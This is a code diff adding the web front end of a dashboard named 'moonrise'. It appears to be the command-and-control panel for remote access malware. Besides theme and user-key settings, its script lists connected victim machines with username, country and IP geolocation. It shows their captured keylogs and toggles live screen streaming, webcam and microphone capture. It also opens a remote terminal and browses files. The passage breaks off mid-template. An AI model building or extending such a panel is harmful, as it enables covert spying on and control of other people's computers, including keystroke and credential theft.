+                                        <div class="grid grid-cols-3 gap-2 mb-4">
+                                            <button onclick="setBgType('image')" id="bgTypeImage" class="bg-white/10 hover:bg-white/20 px-3 py-2.5 rounded-xl text-[10px] font-bold border border-white/10 transition-all flex items-center justify-center gap-2" data-active="true">
+                                                <i class="fas fa-image"></i>Image
+                                            </button>
+                                            <button onclick="setBgType('video')" id="bgTypeVideo" class="bg-white/5 hover:bg-white/10 px-3 py-2.5 rounded-xl text-[10px] font-bold border border-white/5 transition-all flex items-center justify-center gap-2">
+                                                <i class="fas fa-video"></i>Video
+                                            </button>
+                                            <button onclick="setBgType('gradient')" id="bgTypeGradient" class="bg-white/5 hover:bg-white/10 px-3 py-2.5 rounded-xl text-[10px] font-bold border border-white/5 transition-all flex items-center justify-center gap-2">
+                                                <i class="fas fa-palette"></i>Gradient
+                                            </button>
+                                        </div>
+
+                                        <div id="bgMediaInput">
+                                            <div class="flex gap-2">
+                                                <input id="bgUrlInput" placeholder="https://example.com/image.jpg" class="flex-1 bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-xs text-white focus:border-theme outline-none transition-all">
+                                                <button onclick="applyBackground()" class="config-apply-btn bg-theme/20 text-theme px-4 rounded-xl text-xs font-bold border border-theme/30 transition-all">
+                                                    <i class="fas fa-check"></i>
+                                                </button>
+                                            </div>
+                                        </div>
+
+                                        <div id="videoControls" class="hidden mt-4 space-y-3 p-4 bg-black/30 rounded-xl border border-white/5">
+                                            <div class="flex items-center justify-between">
+                                                <span class="text-[10px] text-zinc-400 font-medium">Opacity</span>
+                                                <div class="flex items-center gap-2">
+                                                    <input type="range" id="videoOpacity" min="10" max="100" value="30" onchange="updateVideoOpacity(this.value)" class="w-24 accent-theme">
+                                                    <span id="opacityValue" class="text-[10px] text-theme font-mono w-8">30%</span>
+                                                </div>
+                                            </div>
+                                            <div class="flex items-center justify-between">
+                                                <span class="text-[10px] text-zinc-400 font-medium">Blur</span>
+                                                <div class="flex items-center gap-2">
+                                                    <input type="range" id="videoBlur" min="0" max="20" value="0" onchange="updateVideoBlur(this.value)" class="w-24 accent-theme">
+                                                    <span id="blurValue" class="text-[10px] text-theme font-mono w-8">0px</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Interface Options -->
+                                    <div class="bg-surface/60 border border-white/5 rounded-2xl p-5 backdrop-blur-sm hover:border-theme/20 transition-all">
+                                        <div class="flex items-center gap-3 mb-4">
+                                            <div class="w-8 h-8 rounded-lg bg-blue-500/20 flex items-center justify-center">
+                                                <i class="fas fa-sliders-h text-blue-400 text-sm"></i>
+                                            </div>
+                                            <h3 class="text-sm font-bold text-white">Interface</h3>
+                                        </div>
+                                        
+                                        <div class="space-y-3">
+                                            <div class="flex items-center justify-between p-3 bg-black/30 rounded-xl">
+                                                <div class="flex items-center gap-3">
+                                                    <i class="fas fa-glass-martini text-zinc-500 text-xs"></i>
+                                                    <span class="text-xs text-white">Glass Effect</span>
+                                                </div>
+                                                <label class="relative inline-flex items-center cursor-pointer">
+                                                    <input type="checkbox" id="glassEffect" onchange="toggleGlassEffect(this.checked)" checked class="sr-only peer">
+                                                    <div class="w-10 h-5 bg-white/10 rounded-full peer peer-checked:after:translate-x-5 after:content-[''] after:absolute after:top-0.5 after:left-0.5 after:bg-white after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-theme"></div>
+                                                </label>
+                                            </div>
+
+                                            <div class="flex items-center justify-between p-3 bg-black/30 rounded-xl">
+                                                <div class="flex items-center gap-3">
+                                                    <i class="fas fa-magic text-zinc-500 text-xs"></i>
+                                                    <span class="text-xs text-white">Animations</span>
+                                                </div>
+                                                <label class="relative inline-flex items-center cursor-pointer">
+                                                    <input type="checkbox" id="animations" onchange="toggleAnimations(this.checked)" checked class="sr-only peer">
+                                                    <div class="w-10 h-5 bg-white/10 rounded-full peer peer-checked:after:translate-x-5 after:content-[''] after:absolute after:top-0.5 after:left-0.5 after:bg-white after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-theme"></div>
+                                                </label>
+                                            </div>
+
+                                            <div class="p-3 bg-black/30 rounded-xl">
+                                                <div class="flex items-center justify-between mb-2">
+                                                    <div class="flex items-center gap-3">
+                                                        <i class="fas fa-adjust text-zinc-500 text-xs"></i>
+                                                        <span class="text-xs text-white">Panel Opacity</span>
+                                                    </div>
+                                                    <span id="panelOpacityValue" class="text-[10px] text-theme font-mono">100%</span>
+                                                </div>
+                                                <input type="range" id="panelOpacity" min="50" max="100" value="100" onchange="updatePanelOpacity(this.value)" class="w-full accent-theme">
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Right Column -->
+                                <div class="space-y-6">
+                                    <!-- User Management -->
+                                    <div class="bg-surface/60 border border-white/5 rounded-2xl p-5 backdrop-blur-sm hover:border-theme/20 transition-all">
+                                        <div class="flex items-center justify-between mb-4">
+                                            <div class="flex items-center gap-3">
+                                                <div class="w-8 h-8 rounded-lg bg-amber-500/20 flex items-center justify-center">
+                                                    <i class="fas fa-users text-amber-400 text-sm"></i>
+                                                </div>
+                                                <h3 class="text-sm font-bold text-white">Users</h3>
+                                            </div>
+                                            <span class="text-[9px] bg-red-500/20 text-red-400 px-2 py-1 rounded-lg font-bold">ADMIN</span>
+                                        </div>
+                                        
+                                        <div class="space-y-3 mb-4" id="addUserForm">
+                                            <div class="grid grid-cols-2 gap-2">
+                                                <input id="newUsername" type="text" placeholder="Username" class="bg-black/40 border border-white/10 rounded-xl px-3 py-2.5 text-xs text-white focus:border-theme outline-none transition-all">
+                                                <input id="newKeyInput" type="text" placeholder="Access key" class="bg-black/40 border border-white/10 rounded-xl px-3 py-2.5 text-xs text-white focus:border-theme outline-none font-mono transition-all">
+                                            </div>
+                                            
+                                            <label class="flex items-center gap-3 cursor-pointer p-3 bg-black/30 rounded-xl hover:bg-black/40 transition-all">
+                                                <input type="checkbox" id="newUserAdmin" class="sr-only peer">
+                                                <div class="w-5 h-5 rounded-lg border-2 border-white/20 bg-white/5 flex items-center justify-center peer-checked:border-theme peer-checked:bg-theme/20 transition-all">
+                                                    <i class="fas fa-crown text-theme text-[10px] opacity-0 peer-checked:opacity-100 transition-opacity"></i>
+                                                </div>
+                                                <span class="text-xs text-zinc-400">Admin Privileges</span>
+                                            </label>
+                                            
+                                            <button onclick="addAccessKey()" class="w-full bg-theme/20 hover:bg-theme/30 text-theme border border-theme/30 py-2.5 rounded-xl text-xs font-bold transition-all hover:shadow-[0_0_15px_var(--theme-color)] flex items-center justify-center gap-2">
+                                                <i class="fas fa-user-plus"></i>Add User
+                                            </button>
+                                        </div>
+
+                                        <div id="keysList" class="space-y-2 max-h-48 overflow-y-auto custom-scroll">
+                                            <div class="text-center py-4 text-zinc-600 text-xs">Loading...</div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Actions -->
+                                    <div class="grid grid-cols-2 gap-4">
+                                        <button onclick="saveSettingsToServer()" class="bg-theme/20 hover:bg-theme/30 text-theme border border-theme/30 p-4 rounded-2xl text-xs font-bold transition-all hover:shadow-[0_0_20px_var(--theme-color)] flex flex-col items-center gap-2">
+                                            <i class="fas fa-save text-lg"></i>
+                                            Save Settings
+                                        </button>
+                                        <button onclick="resetAllSettings()" class="bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/30 p-4 rounded-2xl text-xs font-bold transition-all hover:shadow-[0_0_20px_rgba(239,68,68,0.3)] flex flex-col items-center gap-2">
+                                            <i class="fas fa-undo text-lg"></i>
+                                            Reset All
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Logic Script -->
+    <script>
+        const socket = io();
+        let selectedClientId = null;
+        let clientsCache = {};
+        let currentPath = '.';
+
+        function toggleMobileSidebar() {
+            const sidebar = document.getElementById('sidebar');
+            const overlay = document.getElementById('sidebarOverlay');
+            const isOpen = sidebar.classList.contains('mobile-open');
+            
+            if (isOpen) {
+                sidebar.classList.remove('mobile-open');
+                overlay.classList.remove('active');
+                document.body.classList.remove('sidebar-open');
+                document.body.style.overflow = '';
+            } else {
+                sidebar.classList.add('mobile-open');
+                overlay.classList.add('active');
+                document.body.classList.add('sidebar-open');
+                document.body.style.overflow = 'hidden'; // Предотвращаем прокрутку фона
+            }
+        }
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                const sidebar = document.getElementById('sidebar');
+                if (sidebar && sidebar.classList.contains('mobile-open')) {
+                    toggleMobileSidebar();
+                }
+            }
+        });
+
+        function switchTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
+            const target = document.getElementById(tabId + '-tab');
+            if(target) target.classList.remove('hidden');
+
+            document.querySelectorAll('.nav-btn').forEach(btn => btn.removeAttribute('data-active'));
+            const activeBtn = document.querySelector(`button[onclick="switchTab('${tabId}')"]`);
+            if(activeBtn) activeBtn.setAttribute('data-active', 'true');
+        }
+
+        function setTheme(color) {
+            document.documentElement.style.setProperty('--theme-color', color);
+            localStorage.setItem('moonrise-theme', color);
+            saveSettingsToServer();
+        }
+
+        let currentBgType = 'image';
+        function setBgType(type) {
+            currentBgType = type;
+            localStorage.setItem('moonrise-bg-type', type);
+            
+            ['image', 'video', 'gradient'].forEach(t => {
+                const btn = document.getElementById('bgType' + t.charAt(0).toUpperCase() + t.slice(1));
+                if(btn) {
+                    if(t === type) {
+                        btn.setAttribute('data-active', 'true');
+                        btn.classList.add('bg-theme', 'text-black');
+                        btn.classList.remove('bg-white/5', 'bg-white/10');
+                    } else {
+                        btn.removeAttribute('data-active');
+                        btn.classList.remove('bg-theme', 'text-black');
+                        btn.classList.add('bg-white/5');
+                    }
+                }
+            });
+
+            const videoControls = document.getElementById('videoControls');
+            const mediaInput = document.getElementById('bgMediaInput');
+            if(type === 'video') {
+                videoControls.classList.remove('hidden');
+                mediaInput.classList.remove('hidden');
+            } else if(type === 'gradient') {
+                videoControls.classList.add('hidden');
+                mediaInput.classList.add('hidden');
+                applyBackground(); // Auto-apply gradient
+            } else {
+                videoControls.classList.add('hidden');
+                mediaInput.classList.remove('hidden');
+            }
+        }
+
+        function applyBackground() {
+            const url = document.getElementById('bgUrlInput').value;
+            const video = document.getElementById('bgVideo');
+            
+            if(currentBgType === 'video') {
+                if(url) {
+                    video.src = url;
+                    video.style.display = 'block';
+                    document.body.style.backgroundImage = 'none';
+                    localStorage.setItem('moonrise-bg-url', url);
+                } else {
+                    video.style.display = 'none';
+                    video.src = '';
+                    document.body.style.backgroundImage = 'radial-gradient(circle at 50% 0%, #1a1a20 0%, #030304 80%)';
+                    localStorage.removeItem('moonrise-bg-url');
+                }
+            } else if(currentBgType === 'image') {
+                video.style.display = 'none';
+                video.src = '';
+                if(url) {
+                    document.body.style.backgroundImage = `url('${url}')`;
+                    document.body.style.backgroundSize = 'cover';
+                    document.body.style.backgroundPosition = 'center';
+                    localStorage.setItem('moonrise-bg-url', url);
+                } else {
+                    document.body.style.backgroundImage = 'radial-gradient(circle at 50% 0%, #1a1a20 0%, #030304 80%)';
+                    localStorage.removeItem('moonrise-bg-url');
+                }
+            } else if(currentBgType === 'gradient') {
+                video.style.display = 'none';
+                video.src = '';
+                document.body.style.backgroundImage = 'radial-gradient(circle at 50% 0%, #1a1a20 0%, #030304 80%)';
+                localStorage.removeItem('moonrise-bg-url');
+            }
+            
+            saveSettingsToServer();
+        }
+
+        function updateVideoOpacity(value) {
+            const video = document.getElementById('bgVideo');
+            video.style.opacity = value / 100;
+            document.getElementById('opacityValue').textContent = value + '%';
+            localStorage.setItem('moonrise-video-opacity', value);
+        }
+
+        function updateVideoBlur(value) {
+            const video = document.getElementById('bgVideo');
+            video.style.filter = `blur(${value}px)`;
+            document.getElementById('blurValue').textContent = value + 'px';
+            localStorage.setItem('moonrise-video-blur', value);
+        }
+
+        function toggleGlassEffect(enabled) {
+            const panel = document.querySelector('.glass-panel');
+            if(enabled) {
+                panel.style.backdropFilter = 'blur(20px)';
+            } else {
+                panel.style.backdropFilter = 'none';
+            }
+            localStorage.setItem('moonrise-glass-effect', enabled);
+        }
+
+        function toggleAnimations(enabled) {
+            if(enabled) {
+                document.documentElement.style.setProperty('--animation-duration', '0.4s');
+            } else {
+                document.documentElement.style.setProperty('--animation-duration', '0s');
+            }
+            localStorage.setItem('moonrise-animations', enabled);
+        }
+
+        function updatePanelOpacity(value) {
+            const panel = document.querySelector('.glass-panel');
+            panel.style.opacity = value / 100;
+            document.getElementById('panelOpacityValue').textContent = value + '%';
+            localStorage.setItem('moonrise-panel-opacity', value);
+        }
+
+        function saveSettingsToServer() {
+            const settings = {
+                theme: getComputedStyle(document.documentElement).getPropertyValue('--theme-color').trim(),
+                background: {
+                    type: currentBgType,
+                    url: document.getElementById('bgUrlInput').value,
+                    video_opacity: parseInt(document.getElementById('videoOpacity').value),
+                    video_blur: parseInt(document.getElementById('videoBlur').value)
+                },
+                interface: {
+                    glass_effect: document.getElementById('glassEffect').checked,
+                    animations: document.getElementById('animations').checked,
+                    panel_opacity: parseInt(document.getElementById('panelOpacity').value)
+                }
+            };
+            
+            fetch('/api/settings', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(settings)
+            })
+            .then(r => r.json())
+            .then(data => {
+                if(data.success) {
+                    console.log('[SETTINGS] Saved to server');
+                    localStorage.setItem('moonrise-theme', settings.theme);
+                    localStorage.setItem('moonrise-bg-type', settings.background.type);
+                    localStorage.setItem('moonrise-bg-url', settings.background.url);
+                    localStorage.setItem('moonrise-video-opacity', settings.background.video_opacity);
+                    localStorage.setItem('moonrise-video-blur', settings.background.video_blur);
+                    localStorage.setItem('moonrise-glass-effect', settings.interface.glass_effect);
+                    localStorage.setItem('moonrise-animations', settings.interface.animations);
+                    localStorage.setItem('moonrise-panel-opacity', settings.interface.panel_opacity);
+                }
+            })
+            .catch(e => console.error('[SETTINGS] Save error:', e));
+        }
+        
+        function loadSettingsFromServer() {
+            fetch('/api/settings')
+            .then(r => r.json())
+            .then(data => {
+                isAdmin = data.is_admin || false;
+                console.log('[AUTH] Admin status:', isAdmin);
+                
+                const settings = data.ui_settings || {};
+                
+                if(settings.theme) {
+                    document.documentElement.style.setProperty('--theme-color', settings.theme);
+                    localStorage.setItem('moonrise-theme', settings.theme);
+                }
+                
+                if(settings.background) {
+                    const bg = settings.background;
+                    if(bg.type) {
+                        setBgType(bg.type);
+                        localStorage.setItem('moonrise-bg-type', bg.type);
+                    }
+                    if(bg.url) {
+                        document.getElementById('bgUrlInput').value = bg.url;
+                        localStorage.setItem('moonrise-bg-url', bg.url);
+                        applyBackground();
+                    }
+                    if(bg.video_opacity) {
+                        document.getElementById('videoOpacity').value = bg.video_opacity;
+                        updateVideoOpacity(bg.video_opacity);
+                    }
+                    if(bg.video_blur !== undefined) {
+                        document.getElementById('videoBlur').value = bg.video_blur;
+                        updateVideoBlur(bg.video_blur);
+                    }
+                }
+                
+                if(settings.interface) {
+                    const ui = settings.interface;
+                    if(ui.glass_effect !== undefined) {
+                        document.getElementById('glassEffect').checked = ui.glass_effect;
+                        toggleGlassEffect(ui.glass_effect);
+                    }
+                    if(ui.animations !== undefined) {
+                        document.getElementById('animations').checked = ui.animations;
+                        toggleAnimations(ui.animations);
+                    }
+                    if(ui.panel_opacity) {
+                        document.getElementById('panelOpacity').value = ui.panel_opacity;
+                        updatePanelOpacity(ui.panel_opacity);
+                    }
+                }
+                
+                console.log('[SETTINGS] Loaded personal settings for:', data.username);
+            })
+            .catch(e => {
+                console.log('[SETTINGS] Server load failed, using localStorage');
+                loadSettingsFromLocalStorage();
+            });
+        }
+
+        function resetAllSettings() {
+            if(confirm('Are you sure you want to reset all settings to default?')) {
+                const defaultSettings = {
+                    theme: '#c084fc',
+                    background: {type: 'gradient', url: '', video_opacity: 30, video_blur: 0},
+                    interface: {glass_effect: true, animations: true, panel_opacity: 100}
+                };
+                
+                fetch('/api/settings', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(defaultSettings)
+                })
+                .then(() => {
+                    localStorage.clear();
+                    location.reload();
+                });
+            }
+        }
+
+        function loadSettingsFromLocalStorage() {
+            const savedTheme = localStorage.getItem('moonrise-theme');
+            if(savedTheme) {
+                document.documentElement.style.setProperty('--theme-color', savedTheme);
+            }
+            
+            const bgType = localStorage.getItem('moonrise-bg-type') || 'image';
+            setBgType(bgType);
+            
+            const bgUrl = localStorage.getItem('moonrise-bg-url');
+            if(bgUrl) {
+                document.getElementById('bgUrlInput').value = bgUrl;
+                applyBackground();
+            }
+            
+            const videoOpacity = localStorage.getItem('moonrise-video-opacity');
+            if(videoOpacity) {
+                document.getElementById('videoOpacity').value = videoOpacity;
+                updateVideoOpacity(videoOpacity);
+            }
+            
+            const videoBlur = localStorage.getItem('moonrise-video-blur');
+            if(videoBlur) {
+                document.getElementById('videoBlur').value = videoBlur;
+                updateVideoBlur(videoBlur);
+            }
+            
+            const glassEffect = localStorage.getItem('moonrise-glass-effect');
+            if(glassEffect !== null) {
+                const enabled = glassEffect === 'true';
+                document.getElementById('glassEffect').checked = enabled;
+                toggleGlassEffect(enabled);
+            }
+            
+            const animations = localStorage.getItem('moonrise-animations');
+            if(animations !== null) {
+                const enabled = animations === 'true';
+                document.getElementById('animations').checked = enabled;
+                toggleAnimations(enabled);
+            }
+            
+            const panelOpacity = localStorage.getItem('moonrise-panel-opacity');
+            if(panelOpacity) {
+                document.getElementById('panelOpacity').value = panelOpacity;
+                updatePanelOpacity(panelOpacity);
+            }
+        }
+
+        let isAdmin = false;
+        
+        function loadAccessKeys() {
+            fetch('/api/keys')
+            .then(r => {
+                if(r.status === 403) {
+                    document.getElementById('keysList').innerHTML = `
+                        <div class="flex flex-col items-center justify-center py-8 px-4">
+                            <div class="w-16 h-16 rounded-full bg-gradient-to-br from-theme/20 to-theme/5 border-2 border-theme/30 flex items-center justify-center mb-4 animate-pulse">
+                                <i class="fas fa-shield-alt text-theme text-2xl"></i>
+                            </div>
+                            <h3 class="text-sm font-bold text-white mb-2">Administrator Access Required</h3>
+                            <p class="text-xs text-zinc-500 text-center max-w-xs">
+                                Only administrators can view and manage users. Contact your admin for access.
+                            </p>
+                        </div>`;
+                    const form = document.getElementById('addUserForm');
+                    if(form) form.style.display = 'none';
+                    throw new Error('Access denied');
+                }
+                return r.json();
+            })
+            .then(data => {
+                const list = document.getElementById('keysList');
+                if(!data.keys || data.keys.length === 0) {
+                    list.innerHTML = '<div class="text-center py-4 text-zinc-600 text-xs">No users found</div>';
+                    return;
+                }
+                
+                list.innerHTML = '';
+                data.keys.forEach(k => {
+                    const adminBadge = k.admin ? '<span class="text-[9px] bg-theme/20 text-theme px-2 py-0.5 rounded font-bold">ADMIN</span>' : '';
+                    list.innerHTML += `
+                        <div class="flex items-center justify-between p-3 bg-black/20 rounded-lg border border-white/5 group hover:border-white/10 transition">
+                            <div class="flex items-center gap-3 flex-1">
+                                <i class="fas fa-user text-theme text-xs"></i>
+                                <div class="flex flex-col">
+                                    <span class="text-xs text-white font-medium">${k.username}</span>
+                                    <span class="text-[10px] text-zinc-600 font-mono blur-key" 
+                                          onclick="copyKey('${k.full_key}')" 
+                                          onmouseenter="this.style.filter='blur(0px)'" 
+                                          onmouseleave="this.style.filter='blur(4px)'" 
+                                          style="filter: blur(4px); cursor: pointer; user-select: none;" 
+                                          title="Click to copy">${k.full_key}</span>
+                                </div>
+                                ${adminBadge}
+                            </div>
+                            <button onclick="deleteAccessKey('${k.full_key}')" class="text-zinc-600 hover:text-red-500 transition opacity-0 group-hover:opacity-100" title="Delete User">
+                                <i class="fas fa-trash text-xs"></i>
+                            </button>
+                        </div>`;
+                });
+            })
+            .catch(e => {
+                console.error('[KEYS] Load error:', e);
+            });
+        }
+        
+        function addAccessKey() {
+            const keyInput = document.getElementById('newKeyInput');
+            const usernameInput = document.getElementById('newUsername');
+            const adminCheckbox = document.getElementById('newUserAdmin');
+            
+            const key = keyInput.value.trim();
+            const username = usernameInput ? usernameInput.value.trim() : 'User';
+            const admin = adminCheckbox ? adminCheckbox.checked : false;
+            
+            if(!key || key.length < 6) {
+                alert('Key must be at least 6 characters');
+                return;
+            }
+            
+            fetch('/api/keys', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({key: key, username: username, admin: admin})
+            })
+            .then(r => r.json())
+            .then(data => {
+                if(data.success) {
+                    keyInput.value = '';
+                    if(usernameInput) usernameInput.value = '';
+                    if(adminCheckbox) adminCheckbox.checked = false;
+                    loadAccessKeys();
+                    console.log('[KEYS] User added successfully');
+                } else {
+                    alert('Error: ' + data.error);
+                }
+            })
+            .catch(e => {
+                console.error('[KEYS] Add error:', e);
+                alert('Failed to add user');
+            });
+        }
+        
+        function copyKey(key) {
+            navigator.clipboard.writeText(key).then(() => {
+                console.log('[KEYS] Key copied:', key.substring(0, 4) + '***');
+            }).catch(e => {
+                console.error('[KEYS] Copy failed:', e);
+            });
+        }
+        
+        function deleteAccessKey(key) {
+            if(!confirm('Delete this user? This action cannot be undone.')) return;
+            
+            fetch(`/api/keys/${encodeURIComponent(key)}`, {method: 'DELETE'})
+            .then(r => r.json())
+            .then(data => {
+                if(data.success) {
+                    loadAccessKeys();
+                    console.log('[KEYS] User deleted successfully');
+                } else {
+                    alert('Error: ' + data.error);
+                }
+            })
+            .catch(e => {
+                console.error('[KEYS] Delete error:', e);
+                alert('Failed to delete user');
+            });
+        }
+        
+        function logout() {
+            if(confirm('Are you sure you want to logout?')) {
+                window.location.href = '/logout';
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            loadSettingsFromServer();
+            loadAccessKeys();
+        });
+        
+        window.addEventListener('beforeunload', () => {
+            saveSettingsToServer();
+        });
+
+        function getCountryFlag(countryCode) {
+            if(!countryCode || countryCode === 'UNK' || countryCode.length !== 2) return '🏴';
+            
+            try {
+                const codePoints = countryCode
+                    .toUpperCase()
+                    .split('')
+                    .map(char => 127397 + char.charCodeAt(0));
+                return String.fromCodePoint(...codePoints);
+            } catch(e) {
+                console.error('[FLAG] Error generating flag:', e);
+                return '🏴';
+            }
+        }
+
+        socket.on('client_list', d => {
+            console.log('[CLIENT_LIST] Received:', d);
+            
+            // Merge new data with existing cache to preserve info
+            Object.keys(d).forEach(id => {
+                if(clientsCache[id] && clientsCache[id].info && !d[id].info) {
+                    // Preserve existing info if new data doesn't have it
+                    d[id].info = clientsCache[id].info;
+                }
+            });
+            
+            clientsCache = d;
+            const listEl = document.getElementById('clientList');
+            listEl.innerHTML = '';
+            
+            if(Object.keys(d).length === 0) {
+                listEl.innerHTML = '<div class="text-center mt-12 text-xs text-zinc-700 italic font-mono"><i class="fas fa-spinner fa-spin mb-2 text-lg"></i><br>Waiting for connection...</div>';
+                return;
+            }
+
+            Object.keys(d).forEach(id => {
+                const c = d[id];
+                const active = id === selectedClientId ? 'active' : '';
+                const geo = c.info && c.info.geo ? c.info.geo : {};
+                const countryCode = geo.countryCode || geo.country_code || 'XX';
+                const flag = getCountryFlag(countryCode);
+                const country = geo.country || 'Unknown';
+                const user = c.info && c.info.user ? c.info.user : 'Unknown';
+                
+                console.log('[CLIENT_LIST] Rendering client:', id, 'Flag:', flag, 'Country:', countryCode);
+                
+                listEl.innerHTML += `
+                    <div onclick="selectClientMobile('${id}')" class="client-item ${active} p-3 mb-1 rounded-lg cursor-pointer group">
+                        <div class="flex justify-between items-center mb-1">
+                            <span class="text-sm font-bold text-zinc-300 group-hover:text-white transition flex items-center gap-2">
+                                <i class="fab fa-windows text-zinc-600 group-hover:text-theme"></i> ${user}
+                            </span>
+                            <span class="country-flag" title="${country} (${countryCode})">${flag}</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-[10px] text-zinc-600 font-mono truncate w-24">${id}</span>
+                            <span class="w-1.5 h-1.5 rounded-full bg-green-500 shadow-[0_0_5px_rgba(34,197,94,0.5)]"></span>
+                        </div>
+                    </div>
+                `;
+            });
+            
+            // Auto-select first client if none selected
+            if(!selectedClientId && Object.keys(d).length > 0) {
+                const firstClientId = Object.keys(d)[0];
+                console.log('[CLIENT_LIST] Auto-selecting first client:', firstClientId);
+                // Wait longer to ensure DOM is ready
+                setTimeout(() => {
+                    console.log('[CLIENT_LIST] Executing auto-select...');
+                    selectClient(firstClientId);
+                }, 1000);
+            }
+            
+            // Auto-update info if client is selected
+            if(selectedClientId && d[selectedClientId]) {
+                console.log('[CLIENT_LIST] Auto-updating info for selected client');
+                setTimeout(() => {
+                    updateInfo(d[selectedClientId]);
+                }, 100);
+            }
+        });
+        
+        // Handle client info updates
+        socket.on('client_info_update', d => {
+            console.log('[INFO_UPDATE] Received:', d);
+            if(d.client_id && clientsCache[d.client_id]) {
+                clientsCache[d.client_id].info = d.info;
+                
+                // Update display if this is the selected client
+                if(d.client_id === selectedClientId) {
+                    console.log('[INFO_UPDATE] Updating display for selected client');
+                    updateInfo(clientsCache[d.client_id]);
+                }
+            }
+        });
+
+        function selectClient(id) {
+            console.log('[CLIENT] ========== SELECT CLIENT ==========');
+            console.log('[CLIENT] ID:', id);
+            console.log('[CLIENT] Cache:', clientsCache[id]);
+            
+            selectedClientId = id;
+            
+            // Update status with null checks
+            const statusDot = document.getElementById('statusDot');
+            const statusText = document.getElementById('statusText');
+            if(statusDot) statusDot.className = 'w-2 h-2 rounded-full bg-green-500 shadow-[0_0_10px_#22c55e]';
+            if(statusText) statusText.innerHTML = `LINKED: <span class="text-white font-bold">${id.substring(0,8)}...</span>`;
+
+            // Update terminal output
+            const termOutput = document.getElementById('termOutput');
+            if(termOutput) termOutput.innerHTML = '<div class="text-zinc-500 mb-2 italic">Session attached.</div>';
+            
+            // Update keylog area
+            const keylogArea = document.getElementById('keylogArea');
+            if(keylogArea && clientsCache[id]) {
+                keylogArea.value = clientsCache[id].keylogs ? clientsCache[id].keylogs.join('') : '';
+            }
+            
+            // Update screen elements
+            const screenPlaceholder = document.getElementById('screenPlaceholder');
+            const screenImg = document.getElementById('screenImg');
+            if(screenPlaceholder) screenPlaceholder.classList.remove('hidden');
+            if(screenImg) screenImg.src = '';
+            
+            // Reset screen stats
+            screenFrameCount = 0;
+            const screenFrameCountEl = document.getElementById('screenFrameCount');
+            const screenLastUpdateEl = document.getElementById('screenLastUpdate');
+            const screenStatusTextEl = document.getElementById('screenStatusText');
+            const screenStatusText2El = document.getElementById('screenStatusText2');
+            
+            if(screenFrameCountEl) screenFrameCountEl.textContent = '0';
+            if(screenLastUpdateEl) screenLastUpdateEl.textContent = '--:--';
+            if(screenStatusTextEl) screenStatusTextEl.textContent = 'Stopped';
+            if(screenStatusText2El) screenStatusText2El.textContent = 'Offline';
+            
+            // Reset screen stream state
+            screenStreamActive = false;
+            const screenStartBtn = document.getElementById('screenStartBtn');
+            const screenStopBtn = document.getElementById('screenStopBtn');
+            if(screenStartBtn) screenStartBtn.classList.remove('hidden');
+            if(screenStopBtn) screenStopBtn.classList.add('hidden');
+            
+            if(typeof webcamActive !== 'undefined' && webcamActive && typeof toggleWebcam === 'function') {
+                toggleWebcam();
+            }
+            if(typeof micOn !== 'undefined' && micOn && typeof toggleMic === 'function') {
+                toggleMic();
+            }
+            
+            // Force update info immediately
+            console.log('[CLIENT] Checking for info...');
+            
+            if(clientsCache[id] && clientsCache[id].info) {
+                console.log('[CLIENT] ✅ Info available, updating display...');
+                console.log('[CLIENT] Info data:', clientsCache[id].info);
+                updateInfo(clientsCache[id]);
+            } else {
+                console.log('[CLIENT] ⚠️ No info available yet');
+                const geoInfo = document.getElementById('geoInfo');
+                const sysInfo = document.getElementById('sysInfo');
+                if(geoInfo) geoInfo.innerHTML = '<p class="text-zinc-500 text-sm italic"><i class="fas fa-spinner fa-spin mr-2"></i>Loading geolocation...</p>';
+                if(sysInfo) sysInfo.innerHTML = '<p class="text-zinc-500 text-sm italic"><i class="fas fa-spinner fa-spin mr-2"></i>Loading system info...</p>';
+            }
+            
+            console.log('[CLIENT] ========================================');
+            
+            if(typeof requestFiles === 'function') requestFiles('.');
+            socket.emit('get_audio_devices', {target_client: id});
+        }
+        
+        function filterClients() {
+            const search = document.getElementById('clientSearch').value.toLowerCase();
+            const items = document.querySelectorAll('.client-item');
+            
+            items.forEach(item => {
+                const text = item.textContent.toLowerCase();
+                if(text.includes(search)) {
+                    item.style.display = '';
+                } else {
+                    item.style.display = 'none';
+                }
+            });
+        }
+
+        function selectClientMobile(id) {
+            selectClient(id);
+            const sidebar = document.getElementById('sidebar');
+            if (sidebar && sidebar.classList.contains('mobile-open')) {
+                toggleMobileSidebar();
+            }
+        }
+
+        function updateInfo(c) {
+            console.log('[INFO] ========== UPDATE INFO CALLED ==========');
+            console.log('[INFO] Client object:', c);
+            console.log('[INFO] Has info?', c && c.info ? 'YES' : 'NO');
+            
+            if(!c || !c.info) {
+                console.error('[INFO] ❌ No client info available!');
+                console.log('[INFO] Client:', c);
+                document.getElementById('geoInfo').innerHTML = '<p class="text-red-500 text-sm italic">⚠️ No data available - check console</p>';
+                document.getElementById('sysInfo').innerHTML = '<p class="text-red-500 text-sm italic">⚠️ No data available - check console</p>';
+                return;
+            }
+            
+            console.log('[INFO] ✅ Client has info, processing...');
+            console.log('[INFO] Full info object:', JSON.stringify(c.info, null, 2));
+            
+            const geo = c.info.geo || {};
+            console.log('[INFO] Geo data:', geo);
+            
+            const countryCode = geo.countryCode || geo.country_code || 'XX';
+            const flag = getCountryFlag(countryCode);
+            
+            const geoHtml = `
+                <div class="flex justify-between text-xs border-b border-white/5 pb-2">
+                    <span class="text-zinc-500">IP Address</span> 
